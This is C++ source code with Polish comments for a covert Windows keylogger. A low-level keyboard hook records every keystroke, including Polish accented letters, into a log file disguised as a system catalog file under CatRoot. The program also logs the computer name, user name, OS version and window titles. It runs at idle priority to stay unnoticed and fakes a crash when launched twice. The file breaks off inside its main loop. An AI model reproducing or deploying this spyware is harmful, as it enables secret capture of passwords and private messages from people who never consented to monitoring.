#include ".\..\..\..\x86_libraries\SSTSOFT\SSTSOFT\tsoft_MAIN.h"
#include ".\..\..\..\x86_libraries\SSTSOFT\SSTSOFT\database\tsoft_database.h"
//---------------------------------------------------------------------------
#include <windows.h>
#include <condefs.h>
//---------------------------------------------------------------------------
#define EXCED 8192
//---------------------------------------------------------------------------
#define dEXHASLO (char)0x00L  // jesli ró¿ne od 0 to plik jest szyfrowany exORem
//---------------------------------------------------------------------------
#define PRV 0
#define CRT 1
#define USR 2
//---------------------------------------------------------------------------

//---------------------------------------------------------------------------
class TBuforPlikowy
{
//---------------------------------------------------------------------------
private:
//---------------------------------------------------------------------------
struct
  { char *nazwa;
    HANDLE handPlik, handMapa;
  } plik;
void  __stdcall SetNazwaPlikuBufora(char *Nazwa);
//---------------------------------------------------------------------------
public:
//---------------------------------------------------------------------------
struct
  { char *temp, *mapa;
    long size, pos[3];
  } bufor;
     __property char *NazwaPlikuBufora = { read = plik.nazwa, write = SetNazwaPlikuBufora };
//---------------------------------------------------------------------------
      __stdcall TBuforPlikowy        (char *Nazwa);
//---------------------------------------------------------------------------
char *__stdcall load                 (long posEnum, long length);
DWORD __stdcall save                (char *info, long posEnum);
DWORD __stdcall error                (void);
//---------------------------------------------------------------------------
      __stdcall ~TBuforPlikowy       (void);
//---------------------------------------------------------------------------
};
//---------------------------------------------------------------------------

__stdcall TBuforPlikowy::TBuforPlikowy(char *Nazwa)
{
plik.nazwa = ts::text::c_str::dup(Nazwa);
bufor.temp = (char*)ts::text::c_str::alloc(EXCED);

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

HANDLE FindHand;
 WIN32_FIND_DATA *FindData = new WIN32_FIND_DATA;
ts::text::c_str::mov(bufor.temp,Nazwa);
for (ts::text::c_str::exchangechar(bufor.temp,'\\','\0'); ts::text::c_str::len(bufor.temp) < ts::text::c_str::len(Nazwa); bufor.temp[ts::text::c_str::len(bufor.temp)] = '\\')
    {if ((FindHand = FindFirstFile(bufor.temp,FindData))==INVALID_HANDLE_VALUE)
          CreateDirectory(bufor.temp, NULL);
     else FindClose(FindHand);
    }
delete FindData;

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

plik.handPlik = CreateFile(Nazwa,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_DELETE,NULL,OPEN_ALWAYS,NULL,NULL);
if (plik.handPlik==INVALID_HANDLE_VALUE || plik.handPlik==NULL)
   {error();
    return;
   }
bufor.size = GetFileSize(plik.handPlik,NULL);
if (bufor.size==0)
    bufor.size= 1;
plik.handMapa = CreateFileMapping(plik.handPlik,NULL,PAGE_READWRITE|SEC_RESERVE|SEC_NOCACHE,0,bufor.size,"Shell_MSO32");
if (plik.handMapa==INVALID_HANDLE_VALUE || plik.handMapa==NULL)
   {error();
    return;
   }
bufor.mapa = (char*)MapViewOfFile(plik.handMapa,FILE_MAP_ALL_ACCESS,0,0,0);
if (bufor.mapa==NULL)
   {error();
    return;
   }
bufor.pos[PRV] = bufor.pos[CRT] = ts::text::c_str::len(bufor.mapa);
}
//---------------------------------------------------------------------------

void  __stdcall TBuforPlikowy::SetNazwaPlikuBufora(char *Nazwa)
{
this->~TBuforPlikowy(); new TBuforPlikowy(Nazwa);
}
//---------------------------------------------------------------------------

char *__stdcall TBuforPlikowy::load(long posEnum, long length)
{
if (bufor.pos[posEnum] + length >= bufor.size)
    return NULL;

bufor.temp = ts::text::c_str::realloc(bufor.temp,length + 1);
strncpy(bufor.temp,(char*)((unsigned long)bufor.mapa + bufor.pos[posEnum]),length);
for (int p = 0; p < length; p++)
     bufor.temp[p] = bufor.temp[p] ^ dEXHASLO;
return bufor.temp;
}
//---------------------------------------------------------------------------

DWORD __stdcall TBuforPlikowy::save(char *info, long posEnum) {
static DWORD length;
length = ts::text::c_str::len(info);

if (bufor.pos[posEnum] + length > (unsigned __int32)bufor.size)
   {bufor.size = bufor.pos[posEnum]+length + EXCED;
    UnmapViewOfFile(bufor.mapa);
        CloseHandle(plik.handMapa);
    plik.handMapa = CreateFileMapping(plik.handPlik,NULL,PAGE_READWRITE|SEC_NOCACHE|SEC_RESERVE,0,bufor.size,NULL);
       bufor.mapa = (char*)MapViewOfFile(plik.handMapa,FILE_MAP_ALL_ACCESS,0,0,0);
   }
strncpy((char*)((unsigned long)bufor.mapa+bufor.pos[posEnum]),info,length);

for (int p = 0; p < length; p++)
    {bufor.mapa[bufor.pos[posEnum]+p] = info[p]^dEXHASLO;
    }
bufor.pos[PRV] = bufor.pos[posEnum];
bufor.pos[posEnum] += length;
bufor.pos[CRT] = bufor.pos[posEnum];
return length;
}
//---------------------------------------------------------------------------

DWORD __stdcall TBuforPlikowy::error(void)
{
char lpMsgBuf[256];
MessageBeep(MB_ICONEXCLAMATION);
FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM,
      NULL,GetLastError(),
      MAKELANGID(LANG_NEUTRAL,SUBLANG_DEFAULT),
      &lpMsgBuf[0],sizeof(lpMsgBuf),NULL);
return MessageBox(NULL,lpMsgBuf,"Problem z...",
MB_OKCANCEL + MB_DEFBUTTON1 + MB_ICONERROR);
}
//---------------------------------------------------------------------------

__stdcall TBuforPlikowy::~TBuforPlikowy(void)
{
if (plik.handPlik!=INVALID_HANDLE_VALUE && plik.handPlik!=NULL)
   {CloseHandle(plik.handPlik);
    if (plik.handMapa!=INVALID_HANDLE_VALUE && plik.handMapa!=NULL)
       {CloseHandle(plik.handMapa);
        if (bufor.mapa!=NULL)
            UnmapViewOfFile(bufor.mapa);
       }
   }
ts::text::c_str::free(plik.nazwa); ts::text::c_str::free(bufor.temp);
}
//---------------------------------------------------------------------------

DWORD __stdcall error(void)
{
char lpMsgBuf[256];
MessageBeep(MB_ICONEXCLAMATION);
FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM,
      NULL,GetLastError(),
      MAKELANGID(LANG_NEUTRAL,SUBLANG_DEFAULT),
      &lpMsgBuf[0],sizeof(lpMsgBuf),NULL);
return MessageBox(NULL,lpMsgBuf,"Problem z...",
MB_OKCANCEL + MB_DEFBUTTON1 + MB_ICONERROR);
}

char lpklawisz[1024];
struct tagPressed
{ bool fCtrl, fMenu, fShift;
} Pressed;
TBuforPlikowy *BuforPlikowy1;
HHOOK llkbdhhook;

LRESULT LowLevelKeyboardProc(INT nCode, WPARAM wParam, LPARAM lParam) {
if (nCode!=HC_ACTION)
    return CallNextHookEx(llkbdhhook,nCode,wParam,lParam);
BOOL fProcHandled = false;
KBDLLHOOKSTRUCT *pkbdllhook = (KBDLLHOOKSTRUCT *)lParam;
KEYDOWN:
if (wParam!=WM_KEYDOWN)
   {goto KEYUP;
   }
if (pkbdllhook->vkCode==VK_LMENU || pkbdllhook->vkCode==VK_RMENU)
   {Pressed.fMenu =true;
    goto KEYEXIT;
   }
else
if (pkbdllhook->vkCode==VK_LCONTROL || pkbdllhook->vkCode==VK_RCONTROL)
   {Pressed.fCtrl =true;
    goto KEYEXIT;
   }
else
if (pkbdllhook->vkCode==VK_LSHIFT || pkbdllhook->vkCode==VK_RSHIFT)
   {Pressed.fShift =true;
    goto KEYEXIT;
   }
else
   {goto KODY;
   }
KEYUP:
if (wParam!=WM_KEYUP)
   {goto KEYEXIT;
   }
if (pkbdllhook->vkCode==VK_LMENU || pkbdllhook->vkCode==VK_RMENU)
   {Pressed.fMenu = false;
    goto KEYEXIT;
   }
else
if (pkbdllhook->vkCode==VK_LCONTROL || pkbdllhook->vkCode==VK_RCONTROL)
   {Pressed.fCtrl = false;
    goto KEYEXIT;
   }
else
if (pkbdllhook->vkCode==VK_LSHIFT || pkbdllhook->vkCode==VK_RSHIFT)
   {Pressed.fShift = false;
    goto KEYEXIT;
   }
else
   {goto KEYEXIT;
   }
KODY:
switch (pkbdllhook->vkCode)
{
case VK_LWIN:
     ExitProcess(0);
fProcHandled = true;
break;
}
      if ((GetKeyState(0x14)&0x8000)==0 ? Pressed.fShift==0 : Pressed.fShift!=0)
         {                                                  //caps lock
        if (Pressed.fMenu==0)
            {
             //  MA£E LITERY
             if (pkbdllhook->vkCode=='A')
                {
                 ts::text::c_str::mov(lpklawisz,"a"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='B')
                {
                 ts::text::c_str::mov(lpklawisz,"b"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='C')
                {
                 ts::text::c_str::mov(lpklawisz,"c"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='D')
                {
                 ts::text::c_str::mov(lpklawisz,"d"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='E')
                {
                 ts::text::c_str::mov(lpklawisz,"e"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='F')
                {
                 ts::text::c_str::mov(lpklawisz,"f"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='G')
                {
                 ts::text::c_str::mov(lpklawisz,"g"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='H')
                {
                 ts::text::c_str::mov(lpklawisz,"h"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='I')
                {
                 ts::text::c_str::mov(lpklawisz,"i"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='J')
                {
                 ts::text::c_str::mov(lpklawisz,"j"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='K')
                {
                 ts::text::c_str::mov(lpklawisz,"k"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='L')
                {
                 ts::text::c_str::mov(lpklawisz,"l"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='M')
                {
                 ts::text::c_str::mov(lpklawisz,"m"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='N')
                {
                 ts::text::c_str::mov(lpklawisz,"n"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='O')
                {
                 ts::text::c_str::mov(lpklawisz,"o"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='P')
                {
                 ts::text::c_str::mov(lpklawisz,"p"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='Q')
                {
                 ts::text::c_str::mov(lpklawisz,"q"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='R')
                {
                 ts::text::c_str::mov(lpklawisz,"r"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='S')
                {
                 ts::text::c_str::mov(lpklawisz,"s"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='T')
                {
                 ts::text::c_str::mov(lpklawisz,"t"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='U')
                {
                 ts::text::c_str::mov(lpklawisz,"u"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='V')
                {
                 ts::text::c_str::mov(lpklawisz,"v"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='W')
                {
                 ts::text::c_str::mov(lpklawisz,"w"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='X')
                {
                 ts::text::c_str::mov(lpklawisz,"x"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='Y')
                {
                 ts::text::c_str::mov(lpklawisz,"y"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='Z')
                {
                 ts::text::c_str::mov(lpklawisz,"z"); goto zapisz;
                }
             }
          else
             {
              //  MA£E Z OGONKAMI
              if (pkbdllhook->vkCode=='A')
                 {
                  ts::text::c_str::mov(lpklawisz,"\¹"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='C')
                 {
                  ts::text::c_str::mov(lpklawisz,"\æ"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='E')
                 {
                  ts::text::c_str::mov(lpklawisz,"\ê"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='L')
                 {
                  ts::text::c_str::mov(lpklawisz,"\³"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='N')
                 {
                  ts::text::c_str::mov(lpklawisz,"\ñ"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='O')
                 {
                  ts::text::c_str::mov(lpklawisz,"\ó"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='S')
                 {
                  ts::text::c_str::mov(lpklawisz,"\œ"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='X')
                 {
                  ts::text::c_str::mov(lpklawisz,"\Ÿ"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='Z')
                 {
                  ts::text::c_str::mov(lpklawisz,"\¿"); goto zapisz;
                 }
             }
         }
      else //DU¯E
         {
        if (Pressed.fMenu==0)
           {
             //  DU¯E LITERY
             if (pkbdllhook->vkCode=='A')
                {
                 ts::text::c_str::mov(lpklawisz,"A"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='B')
                {
                 ts::text::c_str::mov(lpklawisz,"B"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='C')
                {
                 ts::text::c_str::mov(lpklawisz,"C"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='D')
                {
                 ts::text::c_str::mov(lpklawisz,"D"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='E')
                {
                 ts::text::c_str::mov(lpklawisz,"E"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='F')
                {
                 ts::text::c_str::mov(lpklawisz,"F"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='G')
                {
                 ts::text::c_str::mov(lpklawisz,"G"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='H')
                {
                 ts::text::c_str::mov(lpklawisz,"H"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='I')
                {
                 ts::text::c_str::mov(lpklawisz,"I"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='J')
                {
                 ts::text::c_str::mov(lpklawisz,"J"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='K')
                {
                 ts::text::c_str::mov(lpklawisz,"K"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='L')
                {
                 ts::text::c_str::mov(lpklawisz,"L"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='M')
                {
                 ts::text::c_str::mov(lpklawisz,"M"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='N')
                {
                 ts::text::c_str::mov(lpklawisz,"N"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='O')
                {
                 ts::text::c_str::mov(lpklawisz,"O"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='P')
                {
                 ts::text::c_str::mov(lpklawisz,"P"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='Q')
                {
                 ts::text::c_str::mov(lpklawisz,"Q"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='R')
                {
                 ts::text::c_str::mov(lpklawisz,"R"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='S')
                {
                 ts::text::c_str::mov(lpklawisz,"S"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='T')
                {
                 ts::text::c_str::mov(lpklawisz,"T"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='U')
                {
                 ts::text::c_str::mov(lpklawisz,"U"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='V')
                {
                 ts::text::c_str::mov(lpklawisz,"V"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='W')
                {
                 ts::text::c_str::mov(lpklawisz,"W"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='X')
                {
                 ts::text::c_str::mov(lpklawisz,"X"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='Y')
                {
                 ts::text::c_str::mov(lpklawisz,"Y"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='Z')
                {
                 ts::text::c_str::mov(lpklawisz,"Z"); goto zapisz;
                }
             }
          else
             {
              //  DU¯E Z OGONKAMI
              if (pkbdllhook->vkCode=='A')
                 {
                  ts::text::c_str::mov(lpklawisz,"\¥"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='C')
                 {
                  ts::text::c_str::mov(lpklawisz,"\Æ"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='E')
                 {
                  ts::text::c_str::mov(lpklawisz,"\Ê"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='L')
                 {
                  ts::text::c_str::mov(lpklawisz,"\£"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='N')
                 {
                  ts::text::c_str::mov(lpklawisz,"\Ñ"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='O')
                 {
                  ts::text::c_str::mov(lpklawisz,"\Ó"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='S')
                 {
                 ts::text::c_str::mov(lpklawisz,"\Œ"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='X')
                 {
                  ts::text::c_str::mov(lpklawisz,"\"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='Z')
                 {
                  ts::text::c_str::mov(lpklawisz,"\¯"); goto zapisz;
                 }
             }
         }
      if (Pressed.fMenu==0 && Pressed.fShift==0)
         {
          //
          // normalne liczby i znaki specjalne
          //
          if (pkbdllhook->vkCode=='1')
             {
              ts::text::c_str::mov(lpklawisz,"1"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='2')
             {
              ts::text::c_str::mov(lpklawisz,"2"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='3')
             {
              ts::text::c_str::mov(lpklawisz,"3"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='4')
             {
              ts::text::c_str::mov(lpklawisz,"4"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='5')
             {
              ts::text::c_str::mov(lpklawisz,"5"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='6')
             {
              ts::text::c_str::mov(lpklawisz,"6"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='7')
             {
              ts::text::c_str::mov(lpklawisz,"7"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='8')
             {
              ts::text::c_str::mov(lpklawisz,"8"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='9')
             {
              ts::text::c_str::mov(lpklawisz,"9"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='0')
             {
              ts::text::c_str::mov(lpklawisz,"0"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBD)
             {
              ts::text::c_str::mov(lpklawisz,"\-"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBB)
             {
              ts::text::c_str::mov(lpklawisz,"\="); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xDC)
             {
              ts::text::c_str::mov(lpklawisz,"\\"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xDB)
             {
              ts::text::c_str::mov(lpklawisz,"\["); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xDD)
             {
              ts::text::c_str::mov(lpklawisz,"\]"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBA)
             {
              ts::text::c_str::mov(lpklawisz,"\;"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xDE)
             {
              ts::text::c_str::mov(lpklawisz,"\'"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBC)
             {
              ts::text::c_str::mov(lpklawisz,"\,"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBE)
             {
              ts::text::c_str::mov(lpklawisz,"\."); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBF)
             {
              ts::text::c_str::mov(lpklawisz,"\/"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xC0)
             {
              ts::text::c_str::mov(lpklawisz,"\`"); goto zapisz;
             }
         }
      if (Pressed.fMenu!=0 && Pressed.fShift==0)
         {
          // SZIT znaki specjalne
          if (pkbdllhook->vkCode=='1')
             {
              ts::text::c_str::mov(lpklawisz,"\!"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='2')
             {
              ts::text::c_str::mov(lpklawisz,"\@"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='3')
             {
              ts::text::c_str::mov(lpklawisz,"\#"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='4')
             {
              ts::text::c_str::mov(lpklawisz,"\$"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='5')
             {
              ts::text::c_str::mov(lpklawisz,"\%"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='6')
             {
              ts::text::c_str::mov(lpklawisz,"\^"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='7')
             {
              ts::text::c_str::mov(lpklawisz,"\&"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='8')
             {
              ts::text::c_str::mov(lpklawisz,"\*"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='9')
             {
              ts::text::c_str::mov(lpklawisz,"\("); goto zapisz;
             }
          if (pkbdllhook->vkCode=='0')
             {
              ts::text::c_str::mov(lpklawisz,"\)"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBD)
             {
              ts::text::c_str::mov(lpklawisz,"\_"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBB)
             {
              ts::text::c_str::mov(lpklawisz,"\+"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xDC)
             {
              ts::text::c_str::mov(lpklawisz,"\|"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xDB)
             {
              ts::text::c_str::mov(lpklawisz,"\{"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xDD)
             {
              ts::text::c_str::mov(lpklawisz,"\}"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBA)
             {
              ts::text::c_str::mov(lpklawisz,"\:"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xDE)
             {
              ts::text::c_str::mov(lpklawisz,"\""); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBC)
             {
              ts::text::c_str::mov(lpklawisz,"\<"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBE)
             {
              ts::text::c_str::mov(lpklawisz,"\>"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBF)
             {
              ts::text::c_str::mov(lpklawisz,"\?"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xC0)
             {
              ts::text::c_str::mov(lpklawisz,"\~"); goto zapisz;
             }
         }
      if (Pressed.fMenu==0 && (GetKeyState(VK_NUMLOCK)&0x8000)!=0)
         {
          // NUM
          if (pkbdllhook->vkCode==VK_NUMPAD0) //num
             {
              ts::text::c_str::mov(lpklawisz,"0"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD1) //num
             {
              ts::text::c_str::mov(lpklawisz,"1"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD2) //num
             {
              ts::text::c_str::mov(lpklawisz,"2"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD3) //num
             {
              ts::text::c_str::mov(lpklawisz,"3"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD4) //num
             {
              ts::text::c_str::mov(lpklawisz,"4"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD5) //num
             {
              ts::text::c_str::mov(lpklawisz,"5"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD6) //num
             {
              ts::text::c_str::mov(lpklawisz,"6"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD7) //num
             {
              ts::text::c_str::mov(lpklawisz,"7"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD8) //num
             {
              ts::text::c_str::mov(lpklawisz,"8"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD9) //num
             {
              ts::text::c_str::mov(lpklawisz,"9"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_MULTIPLY)
             {
              ts::text::c_str::mov(lpklawisz,"\*"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_ADD) //num
             {
              ts::text::c_str::mov(lpklawisz,"\+"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_SUBTRACT) //num
             {
              ts::text::c_str::mov(lpklawisz,"\-"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_DECIMAL) //num
             {
              ts::text::c_str::mov(lpklawisz,"\,"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_DIVIDE) //num
             {
              ts::text::c_str::mov(lpklawisz,"\/"); goto zapisz;
             }
         }
      if ((Pressed.fMenu)==0)
         {
          // nienormalne
          if (pkbdllhook->vkCode==VK_SPACE)
             {
              ts::text::c_str::mov(lpklawisz,"\ "); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_TAB)
             {
              ts::text::c_str::mov(lpklawisz,"\t"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_RETURN)
             {
              ts::text::c_str::mov(lpklawisz,"\r\n"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_BACK)
             {
              ts::text::c_str::mov(lpklawisz,"[Bck]"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_DELETE)
             {
              ts::text::c_str::mov(lpklawisz,"[Del]"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_ESCAPE)
             {
              ts::text::c_str::mov(lpklawisz,"[Esc]"); goto zapisz;
             }
         }
   goto KEYEXIT; // omin
zapisz:
   BuforPlikowy1->save(lpklawisz,CRT); // << Z GOTO
return (fProcHandled ? TRUE : CallNextHookEx(llkbdhhook,nCode,wParam,lParam));
KEYEXIT:
return  CallNextHookEx(llkbdhhook,nCode,wParam,lParam);
}
//---------------------------------------------------------------------------

WINAPI WinMain(HINSTANCE HInstance, HINSTANCE, LPSTR, int)
{
Pressed.fCtrl = Pressed.fMenu = Pressed.fShift = false;
llkbdhhook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)LowLevelKeyboardProc,GetModuleHandle(NULL), 0);
SetPriorityClass(GetCurrentProcess(),IDLE_PRIORITY_CLASS); // aby nie przeszkadza³
// blokada kilkukrotnego startu
HANDLE hInstanceMutex = ::CreateMutex(NULL,TRUE,"Key32Mutex");
if (GetLastError()==ERROR_ALREADY_EXISTS)
   {char *errorek1 = (char*)0;
    char *errorek2 = (char*)0xFFFFFFFF;
    errorek1[0] = errorek2[0]; // niby fatal errror a tak naprawdê informacja o uruchomieniu
    return -1;
   }
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

SYSTEMTIME SystemTime;
GetLocalTime(&SystemTime);
char *lpnazwa = ts::text::c_str::alloc(256);
GetSystemDirectory(lpnazwa,255);
ts::text::c_str::add(lpnazwa,"\\CatRoot\\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\\MSO32X.cat");
BuforPlikowy1 = new TBuforPlikowy(lpnazwa);
ts::text::c_str::free(lpnazwa);

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

char *HWNDlpTextCrt = ts::text::c_str::allocex(256,""); //nazw current okna
char *HWNDlpTextPrv = ts::text::c_str::allocex(256,""); //nazwa ostatnio aktywnego okna
char *HWNDlpTextLog = ts::text::c_str::allocex(256,""); //nazwa do wpisu
char *HWNDlpTextTmp = ts::text::c_str::allocex(256,""); //nazw temp
//
HWND HWNDIdCrt;
HWND HWNDIdPrv = 0;
//
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//
// jeœli by³y poprzednie wpisy to trzeba je rozdzieliæ
//
if (BuforPlikowy1->bufor.pos[CRT] > 1)
    BuforPlikowy1->save("\r\n\r\n",CRT);
ts::text::c_str::mov(HWNDlpTextLog,"[*%Info o logu%*]:");
//
// data i czas
//
GetDateFormat(LOCALE_USER_DEFAULT,0,&SystemTime,"'Data='dd'.'MM'.'yyyy",HWNDlpTextTmp,255);
ts::text::c_str::add(HWNDlpTextLog,HWNDlpTextTmp);
GetTimeFormat(LOCALE_USER_DEFAULT,0,&SystemTime,"', Czas='HH'.'mm'.'ss",HWNDlpTextTmp,255);
ts::text::c_str::add(HWNDlpTextLog,HWNDlpTextTmp);
//
// wpis nazwy komputera i urzytkownika
//
unsigned long tempLong = 255;
//
GetComputerName(HWNDlpTextTmp,&tempLong);
ts::text::c_str::add(HWNDlpTextLog,", Komp=");
ts::text::c_str::add(HWNDlpTextLog,HWNDlpTextTmp);
GetUserName(HWNDlpTextTmp,&tempLong);
ts::text::c_str::add(HWNDlpTextLog,", User=");
ts::text::c_str::add(HWNDlpTextLog,HWNDlpTextTmp);
//
// wpis rodzaju systemu
//
LPOSVERSIONINFO lpVersionInformation = new OSVERSIONINFO;
lpVersionInformation->dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

if (GetVersionEx(lpVersionInformation))
   {
     char lpVersionNumber[64];
   ts::text::c_str::mov(lpVersionNumber,ts::text::c_str::itoa(lpVersionInformation->dwMajorVersion));
   ts::text::c_str::add(lpVersionNumber,"\.");
   ts::text::c_str::add(lpVersionNumber,ts::text::c_str::itoa(lpVersionInformation->dwMajorVersion));
   //
   if (lpVersionInformation->dwPlatformId == VER_PLATFORM_WIN32_NT)
      {
       ts::text::c_str::add(HWNDlpTextLog,", OS=WinNT ");
       ts::text::c_str::add(HWNDlpTextLog,lpVersionNumber);
       ts::text::c_str::add(HWNDlpTextLog,lpVersionInformation->szCSDVersion);
      }
   else
      {
       ts::text::c_str::add(HWNDlpTextLog,", OS=Win9X ");
       ts::text::c_str::add(HWNDlpTextLog,lpVersionNumber);
       ts::text::c_str::add(HWNDlpTextLog,lpVersionInformation->szCSDVersion);
      }
   }
ts::text::c_str::add(HWNDlpTextLog,"\r\n");
//
BuforPlikowy1->save(HWNDlpTextLog,CRT); // post
//
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//
for (BuforPlikowy1->bufor.pos[USR] = BuforPlikowy1->bufor.pos[PRV] = BuforPlikowy1->bufor.pos[CRT];; Sleep(10000))
    {
    //+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ sprawdzam czy zmieni³o si.ê okno
    //
